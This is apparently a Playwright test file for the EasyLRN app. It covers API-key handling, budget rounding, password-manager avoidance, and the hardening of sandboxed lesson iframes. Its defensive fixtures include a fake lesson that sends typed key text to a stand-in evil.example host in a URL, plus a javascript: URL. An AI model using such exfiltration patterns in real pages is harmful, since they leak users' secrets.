// T-052 (developer, 0.7.1): the fixes of the T-051 findings.
// - T051-D1: a check whose key was deleted / replaced meanwhile says nothing.
// - T051-D2: the threshold field shows what was saved (cents); > 0 but < 0.005 is refused.
// - T051-I1: every member with "HTML" in its name (but innerHTML, outerHTML,
//   insertAdjacentHTML, getHTML) is gone in a lesson; ElementInternals#shadowRoot
//   cannot be replaced by the lesson.
// - T051-I2: characters that are not allowed in a key: a clear message at
//   "Запази" and "Провери" (no request); the mask of a short stored key is not empty.
// - T051-I3: what a lesson sends is never written as it is into the app's console.
// - The key field is never type=password (no "save password" offer in Chrome).
// Only FAKE keys, synthetic lessons, api.anthropic.com only mocked (D-026).
import { test, expect } from '@playwright/test';
import { makeZip, asFile } from '../fixtures/zips.mjs';
import { strToU8 } from '../../vendor/fflate.js';

const KEY = 'sk-ant-test-FAKE-t052-5b1d';
const KEY2 = 'sk-ant-test-FAKE-t052-new-9e2f';
const API = /^https:\/\/api\.anthropic\.com\//;
const OK = { status: 200, body: { id: 'msg_1', type: 'message', role: 'assistant', content: [{ type: 'text', text: 'p' }], usage: { input_tokens: 8, output_tokens: 1 } } };

let logs;
let external;
let apiSeen;
test.beforeEach(async ({ page, context }) => {
  logs = [];
  external = [];
  apiSeen = [];
  page.on('console', (m) => logs.push(`${m.type()}: ${m.text()}`));
  page.on('pageerror', (e) => { if (!/origin "null"/.test(String(e))) logs.push(`pageerror: ${e}`); });
  await context.route(/^(https?|wss?):\/\/(?!localhost)/, (route) => { external.push(route.request().url()); return route.abort(); });
  await page.goto('./');
  await expect(page.locator('[data-screen="courses"]')).toBeVisible();
  await page.evaluate(() => navigator.serviceWorker.ready.then(() => true));
  await page.reload();
});
test.afterEach(() => {
  expect(logs.filter((l) => /EasyLRN:|pageerror/.test(l)).join('\n')).not.toContain('FAKE');
  expect(logs.filter((l) => l.startsWith('pageerror'))).toEqual([]);
  expect(external.filter((u) => !API.test(u))).toEqual([]);
});

const field = (page, name) => page.locator(`[data-screen="settings"] [data-field="${name}"]`);
async function openSettings(page) {
  await page.goto('./#/settings');
  await expect(page.locator('[data-screen="settings"]')).toHaveAttribute('data-loaded', 'yes');
}
async function saveKey(page, key = KEY) {
  await field(page, 'api-key').fill(key);
  await field(page, 'key-save').click();
  await expect(field(page, 'key-status')).toHaveText(`Запазен ключ: •••• ${key.slice(-4)}`);
}
async function mockApi(page, answer) {
  await page.route(API, async (route) => {
    apiSeen.push(route.request().headers()['x-api-key'] || '');
    const a = await answer();
    return route.fulfill({ status: a.status, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: JSON.stringify(a.body ?? {}) });
  });
}
const doc = (body) => strToU8(`<!DOCTYPE html><html lang="bg"><head><meta charset="utf-8"><title>Урок</title></head><body><h1>Урок</h1><p>Текст.</p>${body}</body></html>`);
async function importCourse(page, id, files) {
  const f = asFile(`${id}.zip`, makeZip(files, { root: id }));
  return page.evaluate(async ({ name, bytes }) => {
    const m = await import('./src/course-import.js');
    return m.describeSummary(await m.importCourse([new File([new Uint8Array(bytes)], name)]));
  }, { name: f.name, bytes: [...f.buffer] });
}
async function openLesson(page, id) {
  await page.evaluate(() => {
    window.__probe = {};
    addEventListener('message', (e) => { if (e.data && e.data.probe) window.__probe[e.data.probe] = e.data.v; });
  });
  await page.goto(`./#/c/${id}`);
  await page.goto(`./#/c/${id}/read/0001`);
  const wrap = page.locator('.lesson-frame__wrap').first();
  await expect(wrap).toHaveAttribute('data-lesson-state', 'ready', { timeout: 20000 });
  return wrap;
}
const REP = `<script>function rep(n,v){try{parent.postMessage({probe:n,v:v},'*')}catch(e){}}</script>`;

// ---------------------------------------------------------------------------
test.describe('T051-D1: a late check answer', () => {
  test('"Изтрий" while a check runs: the late 200 changes nothing; "Провери" stays off', async ({ page }) => {
    let release;
    await mockApi(page, () => new Promise((r) => { release = () => r(OK); }));
    await openSettings(page);
    await saveKey(page);
    await field(page, 'key-check').click();
    await expect.poll(() => apiSeen.length).toBe(1);
    await field(page, 'key-delete').click();
    await page.getByRole('alertdialog', { name: 'Изтриване на API ключа' }).locator('[data-field="confirm-yes"]').click();
    await expect(field(page, 'key-message')).toHaveText('Ключът е изтрит.');
    release();
    await page.waitForTimeout(600);
    await expect(field(page, 'key-message')).toHaveText('Ключът е изтрит.');
    await expect(field(page, 'key-status')).toHaveText('Няма запазен ключ.');
    await expect(field(page, 'key-check')).toBeDisabled();
  });

  test('a new key saved while the check of the old one runs: the old answer is dropped, the new key can be checked at once', async ({ page }) => {
    const answers = [];
    await mockApi(page, () => new Promise((r) => answers.push(r)));
    await openSettings(page);
    await saveKey(page);
    await field(page, 'key-check').click();
    await expect.poll(() => apiSeen.length).toBe(1);
    await saveKey(page, KEY2);
    await expect(field(page, 'key-message')).toHaveText(/^Ключът е запазен/);
    await expect(field(page, 'key-check')).toBeEnabled();
    answers[0](OK); // the old key "works": must not be said about the new one
    await page.waitForTimeout(600);
    await expect(field(page, 'key-message')).toHaveText(/^Ключът е запазен/);
    // The new key is checked with its own request.
    await field(page, 'key-check').click();
    await expect.poll(() => apiSeen.length).toBe(2);
    expect(apiSeen[1]).toBe(KEY2);
    answers[1]({ status: 401, body: { type: 'error', error: { type: 'authentication_error', message: 'x' } } });
    await expect(field(page, 'key-message')).toHaveText(/^Ключът е невалиден \(401\)/);
  });
});

// ---------------------------------------------------------------------------
test.describe('T051-D2: the threshold is what the field shows', () => {
  test('cents: 2.257 → 2.26 shown and saved (and said); 0.004 refused, 0.005 → 0.01; 0 = no warning (hint)', async ({ page }) => {
    await openSettings(page);
    const budget = field(page, 'budget');
    const saved = () => page.evaluate(async () => (await (await import('./src/db.js')).getSettings()).monthlyBudgetUSD);
    const set = async (v) => { await budget.fill(v); await budget.press('Tab'); await page.waitForTimeout(150); };
    await expect(field(page, 'budget-hint')).toHaveText('До цент; 0 — без предупреждение за разход.');
    await set('2.257');
    await expect(field(page, 'budget-message')).toHaveText('Запазено като 2.26 (закръглено до цент).');
    await expect(budget).toHaveValue('2.26');
    expect(await saved()).toBe(2.26);
    await set('0.004');
    await expect(field(page, 'budget-message')).toHaveText('Най-малкият праг е 0.01 (0 значи без предупреждение).');
    await expect(budget).toHaveValue('2.26');
    expect(await saved()).toBe(2.26);
    await set('0.005');
    await expect(budget).toHaveValue('0.01');
    expect(await saved()).toBe(0.01);
    await set('7.5');
    await expect(field(page, 'budget-message')).toHaveText('Запазено.');
    await expect(budget).toHaveValue('7.5');
    await set('0');
    await expect(field(page, 'budget-message')).toHaveText('Запазено.');
    expect(await saved()).toBe(0);
    await page.reload();
    await expect(page.locator('[data-screen="settings"]')).toHaveAttribute('data-loaded', 'yes');
    await expect(budget).toHaveValue('0');
  });
});

// ---------------------------------------------------------------------------
test.describe('T051-I2: characters that are not allowed in a key', () => {
  const BAD = 'Ключът съдържа непозволени знаци — копирай го наново от Claude Console.';
  test('"Запази": a space, a tab, a control character, Cyrillic, a zero-width space inside → the message; spaces around are dropped', async ({ page }) => {
    await openSettings(page);
    const msg = field(page, 'key-message');
    for (const v of ['sk-ant-test-FAKE-00 00-1111', 'sk-ant-test-FAKE-00\t00-1111', 'sk-ant-test-FAKE-00\u000700-1111',
      'sk-ant-test-FAKE-ключ-1111', 'sk-ant-test-FAKE-​0000-1111', 'sk-ant-test-FAKE-0000-1111é', 'sk-ant-test-FAKE-0000 1111']) {
      await field(page, 'api-key').fill(v);
      await field(page, 'key-save').click();
      await expect(msg, JSON.stringify(v)).toHaveText(BAD);
    }
    expect(await page.evaluate(async () => (await import('./src/db.js')).getApiKey())).toBeFalsy();
    await field(page, 'api-key').fill(`  \t${KEY}  `);
    await field(page, 'key-save').click();
    await expect(field(page, 'key-status')).toHaveText(`Запазен ключ: •••• ${KEY.slice(-4)}`);
    expect(await page.evaluate(async () => (await import('./src/db.js')).getApiKey())).toBe(KEY);
  });

  test('"Провери" with a stored key that never went through the field: the same message, no request; a short key is masked with dots', async ({ page }) => {
    await mockApi(page, () => OK);
    for (const [stored, mask, text] of [
      ['sk-ant-test-FAKE-ключ-0000', `•••• 0000`, BAD],
      ['sk-ant-test-FAKE-0000 1111', `•••• 1111`, BAD],
      ['abc', '••••', /започва със „sk-ant-“/],
      ['sk-ant-x', '••••', /дължината/],
    ]) {
      await page.evaluate(async (k) => (await import('./src/db.js')).saveApiKey(k), stored);
      await openSettings(page);
      await expect(field(page, 'key-status')).toHaveText(`Запазен ключ: ${mask}`);
      await field(page, 'key-check').click();
      await expect(field(page, 'key-message')).toHaveText(text);
      await page.goto('./#/');
    }
    expect(apiSeen).toEqual([]);
  });

  test('checkKey() itself refuses such a key before any fetch (T-021 uses it too)', async ({ page }) => {
    await mockApi(page, () => OK);
    const r = await page.evaluate(async () => (await import('./src/claude.js')).checkKey({ apiKey: 'sk-ant-test-FAKE-тест-1234', model: 'claude-sonnet-5-5' }));
    expect(r).toMatchObject({ ok: false, kind: 'bad-key', status: 0 });
    expect(r.text).not.toContain('FAKE');
    expect(apiSeen).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
test.describe('the key field: no "save password" offer', () => {
  test('never type=password (also after "Покажи"/"Скрий" and "Запази"); hidden with text-security; no form, no name; manager hints', async ({ page }) => {
    await openSettings(page);
    const input = field(page, 'api-key');
    const state = () => input.evaluate((i) => ({ type: i.type, masked: i.dataset.masked, security: getComputedStyle(i).webkitTextSecurity }));
    expect(await state()).toEqual({ type: 'text', masked: 'yes', security: 'disc' });
    await input.fill(KEY);
    await field(page, 'key-show').click();
    expect(await state()).toEqual({ type: 'text', masked: 'no', security: 'none' });
    await expect(field(page, 'key-show')).toHaveText('Скрий');
    await expect(field(page, 'key-show')).toHaveAttribute('aria-pressed', 'true');
    await field(page, 'key-show').click();
    expect(await state()).toEqual({ type: 'text', masked: 'yes', security: 'disc' });
    await field(page, 'key-show').click();
    await field(page, 'key-save').click();
    await expect(input).toHaveValue('');
    expect(await state()).toEqual({ type: 'text', masked: 'yes', security: 'disc' });
    const attrs = await input.evaluate((i) => ({
      form: !!i.form, name: i.getAttribute('name'), ac: i.getAttribute('autocomplete'), lp: i.getAttribute('data-lpignore'),
      op: i.getAttribute('data-1p-ignore'), id: i.id,
      passwords: document.querySelectorAll('input[type="password"]').length, forms: document.querySelectorAll('form').length,
    }));
    expect(attrs).toEqual({ form: false, name: null, ac: 'off', lp: 'true', op: 'true', id: 'settings-api-key', passwords: 0, forms: 0 });
    expect(attrs.id).not.toMatch(/pass/i);
  });
});

// ---------------------------------------------------------------------------
test.describe('T051-I1: HTML parser entry points in a lesson', () => {
  test('every member with "HTML" in its name on every interface is gone, but the four kept; ElementInternals#shadowRoot is fixed', async ({ page }) => {
    const code = `${REP}<script>
      var left = [];
      for (var n of Object.getOwnPropertyNames(window)) {
        if (!/^[A-Z]/.test(n) || /^Trusted/.test(n)) continue;
        var d = Object.getOwnPropertyDescriptor(window, n); var C = d && d.value;
        if (typeof C !== 'function') continue;
        var objs = [[n, C]]; if (C.prototype && typeof C.prototype === 'object') objs.push([n + '.prototype', C.prototype]);
        for (var [k, o] of objs) for (var p of Object.getOwnPropertyNames(o)) {
          if (!/HTML/.test(p)) continue;
          var pd = Object.getOwnPropertyDescriptor(o, p);
          if (pd.value !== undefined || pd.get) left.push(k + '.' + p);
        }
      }
      rep('left', left.sort().join(' '));
      var ei = Object.getOwnPropertyDescriptor(ElementInternals.prototype, 'shadowRoot');
      rep('ei', String(!!ei.get) + ':' + ei.configurable);
      try { Object.defineProperty(ElementInternals.prototype, 'shadowRoot', { get: function () { return null; } }); rep('eiReplace', 'yes'); } catch (e) { rep('eiReplace', 'no'); }
      try { Element.prototype.setHTML = function () {}; } catch (e) {}
      rep('setHTML', typeof Element.prototype.setHTML + ':' + typeof Document.parseHTML + ':' + typeof Document.parseHTMLUnsafe);
      // A custom element with a closed root still works (the guard only watches it).
      customElements.define('x-c', class extends HTMLElement { constructor() { super(); this._i = this.attachInternals(); this.attachShadow({ mode: 'closed' }).innerHTML = '<b>в</b>'; } });
      var x = document.createElement('x-c'); document.body.append(x);
      rep('ce', String(!!x._i.shadowRoot));
    </script>`;
    await importCourse(page, 'LRN-F1', { 'INDEX.md': strToU8('# LRN-F1\n'), 'lessons/0001-f.html': doc(code) });
    await openLesson(page, 'LRN-F1');
    await expect.poll(() => page.evaluate(() => 'ce' in window.__probe)).toBe(true);
    const probe = await page.evaluate(() => window.__probe);
    console.log(`T-052 HTML members left in a lesson: ${probe.left}`);
    const left = probe.left.split(' ').filter(Boolean);
    const kept = new Set(['innerHTML', 'outerHTML', 'insertAdjacentHTML', 'getHTML']);
    expect(left.filter((m) => !kept.has(m.split('.').pop()))).toEqual([]);
    expect(left).toEqual(expect.arrayContaining(['Element.prototype.innerHTML', 'Element.prototype.insertAdjacentHTML']));
    expect(probe.ei).toBe('true:false');
    expect(probe.eiReplace).toBe('no');
    expect(probe.setHTML).toBe('undefined:undefined:undefined');
    expect(probe.ce).toBe('true');
  });
});

// ---------------------------------------------------------------------------
test.describe('T051-I3: what a lesson sends never reaches the console as it is', () => {
  test('lrn:link with typed text in the URL (not in the links, a bad URL, javascript:): the app logs only scheme and lengths', async ({ page }) => {
    const LINK = `${REP}<input id="k"><button id="go">Изпрати</button><script>
      function send(h){parent.postMessage({lrn:1,v:1,type:'lrn:link',href:h},'*')}
      setTimeout(function(){ send('https://sk-ant-test-FAKE-host.evil.example/p?k=sk-ant-test-FAKE-q'); send('not a url sk-ant-test-FAKE-x'); rep('early',1); }, 300);
      document.getElementById('go').addEventListener('click', function(){ var v=document.getElementById('k').value;
        send('https://evil.example/x?k=' + v); send('javascript:alert(' + JSON.stringify(v) + ')'); rep('done', 1); });
    </script>`;
    await importCourse(page, 'LRN-F3', { 'INDEX.md': strToU8('# LRN-F3\n'), 'lessons/0001-l.html': doc(LINK) });
    await openLesson(page, 'LRN-F3');
    await expect.poll(() => page.evaluate(() => 'early' in window.__probe)).toBe(true);
    const lf = page.frameLocator('.lesson-frame__wrap iframe').first();
    await lf.locator('#k').fill('sk-ant-test-FAKE-typed-0000');
    await lf.locator('#go').click();
    await expect.poll(() => page.evaluate(() => 'done' in window.__probe)).toBe(true);
    await page.waitForTimeout(300);
    const app = logs.filter((l) => l.includes('EasyLRN: lesson message ignored'));
    console.log(`T-052 app console lines: ${JSON.stringify(app)}`);
    expect(app.length).toBeGreaterThanOrEqual(4);
    for (const l of app) {
      expect(l).not.toMatch(/FAKE|evil|alert|typed|not a url/);
    }
    expect(app.some((l) => /https: URL, host \d+ \+ \d+ characters/.test(l))).toBe(true);
    expect(app.some((l) => /javascript: URL/.test(l))).toBe(true);
    expect(app.some((l) => /text, \d+ characters/.test(l))).toBe(true);
    expect(page.url()).toMatch(/^http:\/\/localhost:\d+\/EasyLRN\//);
  });

  test('describeForLog(): only scheme and lengths, unknown schemes as "other:"', async ({ page }) => {
    const r = await page.evaluate(async () => {
      const { describeForLog } = await import('./src/lesson-frame.js');
      return [describeForLog('https://a.example/b?c=1'), describeForLog('sk-ant-test-FAKE-scheme:xyz'), describeForLog('плain'), describeForLog({ a: 1 }), describeForLog(null)];
    });
    expect(r).toEqual(['https: URL, host 9 + 8 characters', 'other: URL, host 0 + 3 characters', 'text, 5 characters', 'object', 'null']);
  });
});
